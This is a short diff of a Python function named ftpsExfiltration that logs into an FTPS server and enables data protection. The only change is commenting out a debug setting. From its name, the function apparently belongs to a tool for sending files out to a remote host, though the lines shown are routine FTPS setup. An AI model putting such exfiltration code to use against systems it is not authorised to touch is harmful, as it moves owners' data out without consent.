@@ -39,8 +39,7 @@ def ftpsExfiltration(host, user, passwd, fileList):
         ftps.login(user=user, passwd=passwd)
         logging.debug('FTPS logon, user: %s', user)
 
-        # temporary
-        ftps.debugging = 2
+        # ftps.debugging = 2
 
         ftps.prot_p()
         logging.debug('FTPS Data protection level set to private')
